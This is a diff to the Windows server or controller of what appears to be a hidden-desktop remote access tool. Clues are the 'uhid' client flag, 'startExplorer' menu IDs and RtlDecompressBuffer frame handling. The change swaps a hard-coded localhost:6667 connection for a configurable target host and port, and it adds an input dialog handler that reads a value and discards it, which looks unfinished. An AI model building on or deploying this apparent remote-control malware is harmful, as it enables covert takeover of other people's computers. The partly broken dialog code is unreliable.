@@ -41,6 +41,8 @@ enum SysMenuIds { fullScreen = 101, startExplorer = WM_USER + 1, startRun, start
 
 static Client           g_clients[gc_maxClients];
 static CRITICAL_SECTION g_critSec;
+static int        g_port;
+static char       g_host[MAX_PATH];
 
 static Client* GetClient(void* data, BOOL uhid)
 {
@@ -101,6 +103,28 @@ static void ToggleFullscreen(HWND hWnd, Client* client)
             SWP_SHOWWINDOW);
     }
     client->fullScreen = !client->fullScreen;
+}
+
+
+
+BOOL CALLBACK InputProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    char str[256];
+    int number;
+    switch (msg) {
+    case WM_INITDIALOG:
+        return true;
+    case WM_COMMAND:
+        if (LOWORD(wParam) == IDOK) {
+            GetDlgItemTextA(hWnd, 0, str, 32);
+            number = atoi(str);
+        }
+        if (LOWORD(wParam) == IDCANCEL) {
+            EndDialog(hWnd, true);
+        }
+        return true;
+    }
+
+    return false;
 }
 
 static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -301,10 +325,10 @@ static SOCKET ConnectServer()
     if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
         return NULL;
 
-    hostent* he = gethostbyname("127.0.0.1");
+    hostent* he = gethostbyname(g_host);
     memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(6667);
+    addr.sin_port = htons(g_port);
 
     if (connect(s, (sockaddr*)&addr, sizeof(addr)) < 0)
         return NULL;
@@ -578,13 +602,18 @@ DWORD WINAPI InputThread(PVOID param) {
     printf("[InputThread] End...\n");
 }
 
-BOOL StartServer2(int port)
+BOOL StartServer2(char* target,int port)
 {
     WSADATA     wsa;
     SOCKET      serverSocket;
     sockaddr_in addr;
     HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));
 
+    lstrcpyA(g_host, target);
+
+    g_port = port;
+
+    
     pRtlDecompressBuffer = (T_RtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
     InitializeCriticalSection(&g_critSec);
     memset(g_clients, 0, sizeof(g_clients));
